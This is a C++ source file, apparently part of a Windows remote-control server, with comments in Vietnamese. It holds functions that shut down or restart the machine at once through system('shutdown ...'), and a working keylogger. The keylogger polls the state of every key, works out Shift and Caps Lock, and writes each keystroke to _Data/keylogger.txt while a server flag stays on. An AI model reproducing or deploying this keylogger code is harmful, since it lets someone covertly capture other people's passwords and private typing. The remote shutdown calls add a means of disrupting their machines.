#include "WindowAPI.h"


void ShutdownSystem() {
	system("shutdown /s /t 0");
}
void ResetSystem() {
	system("shutdown /r /t 0");
}
string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed) {
	if (key == VK_SPACE) return "[SPACE]";
	if (key == VK_RETURN) return "[ENTER]";
	if (key == VK_BACK) return "[BACKSPACE]";
	if (key == VK_SHIFT) return "[SHIFT]";
	if (key == VK_CONTROL) return "[CTRL]";
	if (key == VK_TAB) return "[TAB]";
	if (key == VK_ESCAPE) return "[ESC]";
	if (key == VK_LWIN || key == VK_RWIN) return winPressed ? "[WIN]" : "";//Xu ly phim Window

	//Xu li phim so va cac k tu dac biet
	if (key >= '0' && key <= '9') {
		if (shiftPressed) {
			std::string shiftSymbols = ")!@#$%^&*(";  //Shift tuong ung voi cac so
			return string(1, shiftSymbols[key - '0']);
		}
		return string(1, (char)key);  //So binh thuong
	}

	//Xu ly cac phim chu cai
	if (key >= 'A' && key <= 'Z') {
		if (capsLock ^ shiftPressed) {
			return string(1, (char)key);  // Chu Hoa
		}
		return string(1, (char)(key + 32));  // Chu Thuong
	}

	//Xu li cac phim khong chu cai
	switch (key) {
	case VK_OEM_1: return shiftPressed ? ":" : ";";
	case VK_OEM_2: return shiftPressed ? "?" : "/";
	case VK_OEM_3: return shiftPressed ? "~" : "`";
	case VK_OEM_4: return shiftPressed ? "{" : "[";
	case VK_OEM_5: return shiftPressed ? "|" : "\\";
	case VK_OEM_6: return shiftPressed ? "}" : "]";
	case VK_OEM_7: return shiftPressed ? "\"" : "'";
	case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
	case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
	case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
	case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
	}

	return "";  // Khong xu li cac phim khac
}
void Keylogger(bool& isKeyLoggerOn, bool &isServerOn) { 
	//Turn off the app?
	fstream output;
	output.open("_Data/keylogger.txt", ios::out);
	bool capsLock = false;  // Trạng thái của Caps Lock
	bool winPressed = false;  // Trạng thái của phím Windows
	vector<int> previousStates(256, 0);  // Mảng lưu trạng thái của các phím trước đó

	while (isServerOn) {
		if (!isKeyLoggerOn) continue;
		Sleep(10);  // Giảm tải CPU

		// Kiểm tra trạng thái của CapsLock
		capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);

		// Kiểm tra trạng thái của phím Windows
		winPressed = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);

		for (int i = 8; i <= 0xFE; i++) {  // Kiểm tra tất cả các phím từ 0x08 đến 0xFE
			SHORT keyState = GetAsyncKeyState(i);  // Kiểm tra trạng thái phím

			if ((keyState & 0x8000) && !(previousStates[i] & 0x8000)) {  // Phím vừa được nhấn
				bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
				string keyData = TranslateKey(i, capsLock, shiftPressed, winPressed);
				if (!keyData.empty()) {
					output << "Key Pressed: " << keyData << endl;  // In ra màn hình
				}
			}

			// Cập nhật trạng thái của phím
			previousStates[i] = keyState;
		}
	}
	output.close();
}